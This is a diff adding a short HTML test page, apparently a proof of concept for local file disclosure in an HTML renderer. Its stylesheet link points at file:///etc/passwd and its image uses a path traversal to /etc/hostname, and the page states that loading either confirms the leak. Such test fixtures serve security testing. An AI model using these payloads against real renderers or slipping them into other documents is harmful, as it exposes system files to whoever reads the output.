@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+  <!-- Reads an arbitrary local stylesheet -->
+  <link rel="stylesheet" href="file:///etc/passwd">
+</head><body>
+  <!-- Relative traversal to a file outside the document's folder -->
+  <img src="../../../../../../etc/hostname">
+  <p>If the local file is loaded, the disclosure is confirmed.</p>
+</body></html>
